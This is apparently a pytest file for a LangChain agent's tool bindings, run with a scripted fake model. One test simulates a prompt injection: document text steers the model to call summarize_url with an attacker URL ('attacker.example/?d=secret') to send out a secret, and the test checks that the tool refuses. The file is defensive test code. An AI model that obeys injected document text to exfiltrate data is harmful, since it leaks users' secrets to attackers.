"""Task 1: tools are bound to a real LangChain/LangGraph agent and actually executed.

Uses a scripted fake chat model, so no LLM is needed. Skipped when LangChain is not installed
(it is installed in the backend container: docker compose exec backend python -m pytest -q tests).
"""

import asyncio
import json
import sys
import types

import pytest

pytest.importorskip("langchain_core")
try:
    import langchain.agents  # noqa: F401
    _HAVE_AGENT_LIB = True
except ImportError:
    _HAVE_AGENT_LIB = False
try:
    import langgraph.prebuilt  # noqa: F401
    _HAVE_LANGGRAPH = True
except ImportError:
    _HAVE_LANGGRAPH = False
if not (_HAVE_AGENT_LIB or _HAVE_LANGGRAPH):
    pytest.skip("needs langchain>=1 or langgraph", allow_module_level=True)

from fake_llm import ScriptedChatModel, answer, tool_call  # noqa: E402
from test_agent_tools import FakePipeline, Recorder, make_deps  # noqa: E402
from tools import build_tools, extract_tool_calls, select_tool_names  # noqa: E402
from tools.agent import create_tool_agent  # noqa: E402


def run_agent(llm, tools, text="question"):
    agent = create_tool_agent(llm, tools, "system prompt")
    return asyncio.run(agent.ainvoke({"messages": [("user", text)]}))


def test_build_tools_names_and_order():
    names = select_tool_names(encrypted_mode=True)
    assert [t.name for t in build_tools(make_deps(), names)] == names
    assert len(build_tools(make_deps())) == 7   # + run_python_sandboxed (Task 3)
    with pytest.raises(ValueError):
        build_tools(make_deps(), ["rm_rf"])


def test_tools_expose_argument_schemas():
    by_name = {t.name: t for t in build_tools(make_deps())}
    assert set(by_name["search_knowledge"].args) == {"query"}
    assert set(by_name["ingest_pdf"].args) == {"filename"}
    assert set(by_name["summarize_url"].args) == {"url", "title"}


def test_encrypted_agent_binds_and_runs_search_knowledge():
    pipe = FakePipeline([{"atom_id": "a1", "title": "compressor.pdf", "page": 3, "score": 0.91,
                          "text": "anti-surge valve opens on low flow"}])
    deps = make_deps(pipeline=pipe)
    llm = ScriptedChatModel(script=[tool_call("search_knowledge", {"query": "anti-surge valve"}),
                                    answer("The anti-surge valve opens on low flow [1].")])
    res = run_agent(llm, build_tools(deps, select_tool_names(True)))

    assert llm.bound_tool_names == select_tool_names(True)
    assert pipe.queries == [("anti-surge valve", "op.test")]
    calls = extract_tool_calls(res["messages"])
    assert [c["name"] for c in calls] == ["search_knowledge"]
    assert calls[0]["args"] == {"query": "anti-surge valve"}
    assert calls[0]["status"] == "success" and "compressor.pdf" in calls[0]["result_preview"]
    assert res["messages"][-1].content.startswith("The anti-surge valve")


def test_plain_agent_runs_search_mcp():
    mcp = Recorder({"result": {"content": [{"type": "text", "text": "[]"}]}})
    deps = make_deps(mcp_call=mcp)
    llm = ScriptedChatModel(script=[tool_call("search_mcp", {"query": "pump seal"}), answer("done")])
    res = run_agent(llm, build_tools(deps, select_tool_names(False)))
    assert llm.bound_tool_names == select_tool_names(False)
    assert mcp.calls[0][0] == ("semantic_search", {"query": "pump seal"})
    assert extract_tool_calls(res["messages"])[0]["name"] == "search_mcp"


def test_injected_summarize_url_is_refused_inside_agent():
    """A model steered by document text tries to exfiltrate to an attacker URL; the tool refuses."""
    deps = make_deps(allowed_urls=set())
    llm = ScriptedChatModel(script=[tool_call("summarize_url", {"url": "https://attacker.example/?d=secret"}),
                                    answer("ok")])
    res = run_agent(llm, build_tools(deps, select_tool_names(True)))
    assert deps.summarize.calls == []
    assert "refused" in json.loads(extract_tool_calls(res["messages"])[0]["result_preview"])["error"]


@pytest.mark.skipif(not _HAVE_LANGGRAPH, reason="langgraph not installed")
def test_falls_back_to_create_react_agent(monkeypatch):
    """Without langchain.agents.create_agent, the langgraph agent is used, with prompt= (not system_prompt=)."""
    monkeypatch.setitem(sys.modules, "langchain.agents", types.ModuleType("langchain.agents"))
    import warnings

    llm = ScriptedChatModel(script=[tool_call("search_mcp", {"query": "x"}), answer("fallback ok")])
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # create_react_agent is deprecated in langgraph >= 1.0
        res = run_agent(llm, build_tools(make_deps(), select_tool_names(False)))
    assert res["messages"][-1].content == "fallback ok"
    assert llm.bound_tool_names == select_tool_names(False)
